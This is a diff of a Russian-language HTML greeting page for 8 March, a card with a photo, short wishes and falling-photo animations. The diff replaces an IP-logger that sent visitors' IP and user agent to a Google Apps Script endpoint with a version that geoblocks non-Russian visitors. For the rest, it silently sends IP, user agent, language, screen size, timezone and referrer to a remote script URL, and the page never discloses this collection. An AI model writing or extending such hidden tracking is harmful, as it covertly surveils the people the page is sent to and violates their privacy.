@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>8 марта</title>
     <style>
-        /* стили как в последней версии — не меняем */
         * {
             margin: 0;
             padding: 0;
@@ -54,34 +53,9 @@
             animation: floatShape 18s infinite alternate ease-in-out;
         }
 
-        .shape1 {
-            width: 40vmax;
-            height: 40vmax;
-            top: -10vmax;
-            right: -10vmax;
-            background: rgba(90, 140, 210, 0.1);
-            animation-duration: 22s;
-        }
-
-        .shape2 {
-            width: 30vmin;
-            height: 30vmin;
-            bottom: 5vh;
-            left: -5vmin;
-            background: rgba(150, 180, 240, 0.1);
-            filter: blur(50px);
-            animation-duration: 17s;
-        }
-
-        .shape3 {
-            width: 50vmin;
-            height: 50vmin;
-            top: 20vh;
-            left: 30vw;
-            background: rgba(110, 160, 230, 0.08);
-            filter: blur(60px);
-            animation-duration: 25s;
-        }
+        .shape1 { width: 40vmax; height: 40vmax; top: -10vmax; right: -10vmax; background: rgba(90, 140, 210, 0.1); animation-duration: 22s; }
+        .shape2 { width: 30vmin; height: 30vmin; bottom: 5vh; left: -5vmin; background: rgba(150, 180, 240, 0.1); filter: blur(50px); animation-duration: 17s; }
+        .shape3 { width: 50vmin; height: 50vmin; top: 20vh; left: 30vw; background: rgba(110, 160, 230, 0.08); filter: blur(60px); animation-duration: 25s; }
 
         @keyframes floatShape {
             0% { transform: translate(0, 0) scale(1); }
@@ -113,20 +87,10 @@
         }
 
         @keyframes fallConfetti {
-            0% {
-                transform: translateY(0) rotate(0deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.25;
-            }
-            90% {
-                opacity: 0.2;
-            }
-            100% {
-                transform: translateY(110vh) rotate(360deg);
-                opacity: 0;
-            }
+            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.25; }
+            90% { opacity: 0.2; }
+            100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
         }
 
         .content {
@@ -146,6 +110,20 @@
             z-index: 2;
         }
 
+        .blocked-message {
+            max-width: 480px;
+            width: 85%;
+            padding: 2rem;
+            background: rgba(10, 25, 40, 0.3);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 32px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1.2rem;
+            line-height: 1.6;
+        }
+
         @keyframes fadeIn {
             0% { opacity: 0; transform: translateY(12px); }
             100% { opacity: 1; transform: translateY(0); }
@@ -162,9 +140,7 @@
             transition: transform 0.3s ease;
         }
 
-        .photo:hover {
-            transform: scale(1.02);
-        }
+        .photo:hover { transform: scale(1.02); }
 
         p {
             font-size: 1.1rem;
@@ -174,20 +150,21 @@
             text-shadow: 0 1px 3px rgba(0,0,0,0.2);
         }
 
+        .debug-info {
+            margin-top: 1.5rem;
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.3);
+            text-align: left;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 0.8rem;
+            word-break: break-word;
+        }
+
         @media (max-width: 380px) {
-            .content {
-                padding: 1.5rem 1rem;
-            }
-            .photo {
-                max-width: 220px;
-            }
-            p {
-                font-size: 1rem;
-            }
-            .face-particle {
-                width: 30px;
-                height: 30px;
-            }
+            .content { padding: 1.5rem 1rem; }
+            .photo { max-width: 220px; }
+            p { font-size: 1rem; }
+            .face-particle { width: 30px; height: 30px; }
         }
     </style>
 </head>
@@ -201,49 +178,113 @@
 
     <div class="faces-layer" id="facesLayer"></div>
 
-    <div class="content">
-        <img src="photo.jpg" alt="Поздравление" class="photo">
-        <p>Пусть этот день будет именно таким,<br>каким ты захочешь.</p>
-        <p>Тёплым, светлым, тихим —<br>или полным улыбок.</p>
-        <p>Просто знай: сегодня всё для тебя.</p>
-    </div>
+    <!-- Контейнер, который будет заполнен либо контентом, либо заглушкой -->
+    <div id="app"></div>
 
     <script>
-        // --- Падающие лица ---
         (function() {
-            const facesLayer = document.getElementById('facesLayer');
-            const numberOfFaces = 40;
-            for (let i = 0; i < numberOfFaces; i++) {
-                const img = document.createElement('img');
-                img.src = 'photo.jpg';
-                img.alt = '';
-                img.classList.add('face-particle');
-                const size = Math.floor(Math.random() * 20) + 30;
-                img.style.width = size + 'px';
-                img.style.height = size + 'px';
-                img.style.left = Math.random() * 100 + '%';
-                img.style.animationDelay = Math.random() * 15 + 's';
-                img.style.animationDuration = (Math.random() * 10 + 8) + 's';
-                facesLayer.appendChild(img);
+            const app = document.getElementById('app');
+            const scriptURL = 'URL_ТВОЕГО_НОВОГО_СКРИПТА'; // замени на свой URL
+
+            // Функция создания падающих лиц
+            function createFallingFaces() {
+                const facesLayer = document.getElementById('facesLayer');
+                facesLayer.innerHTML = ''; // очищаем перед созданием
+                const numberOfFaces = 40;
+                for (let i = 0; i < numberOfFaces; i++) {
+                    const img = document.createElement('img');
+                    img.src = 'photo.jpg';
+                    img.alt = '';
+                    img.classList.add('face-particle');
+                    const size = Math.floor(Math.random() * 20) + 30;
+                    img.style.width = size + 'px';
+                    img.style.height = size + 'px';
+                    img.style.left = Math.random() * 100 + '%';
+                    img.style.animationDelay = Math.random() * 15 + 's';
+                    img.style.animationDuration = (Math.random() * 10 + 8) + 's';
+                    facesLayer.appendChild(img);
+                }
             }
-        })();
 
-        // --- IP-логгер (с диагностикой в консоли) ---
-        (function() {
-            const scriptURL = 'https://script.google.com/macros/s/AKfycbyf4-fhh8gVQ4mychp5zv8INZf3PxYDqUp7BiRjVTORWDL3RImVL6b6LKmjMAKLJu4/exec'; // ЗАМЕНИ!
+            // Функция отображения контента (для российских посетителей)
+            function showContent() {
+                createFallingFaces();
+                app.innerHTML = `
+                    <div class="content">
+                        <img src="photo.jpg" alt="Поздравление" class="photo">
+                        <p>Пусть этот день будет именно таким,<br>каким ты захочешь.</p>
+                        <p>Тёплым, светлым, тихим —<br>или полным улыбок.</p>
+                        <p>Просто знай: сегодня всё для тебя.</p>
+                        <div class="debug-info" id="debug"></div>
+                    </div>
+                `;
+                
+                // Сбор метаданных (только для российских посетителей)
+                collectMetadata();
+            }
 
-            fetch('https://api.ipify.org?format=json')
+            // Функция отображения заглушки (для остальных)
+            function showBlocked() {
+                app.innerHTML = `
+                    <div class="blocked-message">
+                        ⚡️ Доступ ограничен<br><br>
+                        Этот сайт предназначен только<br>для российских посетителей.
+                    </div>
+                `;
+            }
+
+            // Функция сбора метаданных (как в прошлой версии)
+            function collectMetadata() {
+                const debugDiv = document.getElementById('debug');
+                function addDebug(text) {
+                    if (debugDiv) {
+                        const line = document.createElement('div');
+                        line.textContent = text;
+                        debugDiv.appendChild(line);
+                    }
+                }
+
+                const screenInfo = `${screen.width}x${screen.height}`;
+                const language = navigator.language || 'не определен';
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'не определен';
+                const referrer = document.referrer || 'прямой вход';
+                const ua = navigator.userAgent;
+
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip;
+                        const url = new URL(scriptURL);
+                        url.searchParams.append('ip', ip);
+                        url.searchParams.append('ua', ua);
+                        url.searchParams.append('lang', language);
+                        url.searchParams.append('screen', screenInfo);
+                        url.searchParams.append('tz', timezone);
+                        url.searchParams.append('referrer', referrer);
+                        
+                        return fetch(url.toString());
+                    })
+                    .catch(err => console.log('Метаданные не отправлены'));
+            }
+
+            // Основная проверка страны
+            fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip;
-                    const ua = navigator.userAgent;
-                    console.log('IP:', ip, 'UA:', ua);
-
-                    return fetch(scriptURL + '?ip=' + encodeURIComponent(ip) + '&ua=' + encodeURIComponent(ua));
+                    const countryCode = data.country_code;
+                    console.log('Страна посетителя:', countryCode);
+                    
+                    if (countryCode === 'RU') {
+                        showContent();
+                    } else {
+                        showBlocked();
+                    }
                 })
-                .then(response => response.text())
-                .then(text => console.log('Ответ от скрипта:', text))
-                .catch(err => console.error('Ошибка отправки IP:', err));
+                .catch(error => {
+                    console.error('Ошибка определения страны:', error);
+                    // В случае ошибки API показываем контент (чтобы не блокировать всех)
+                    showContent();
+                });
         })();
     </script>
 </body>
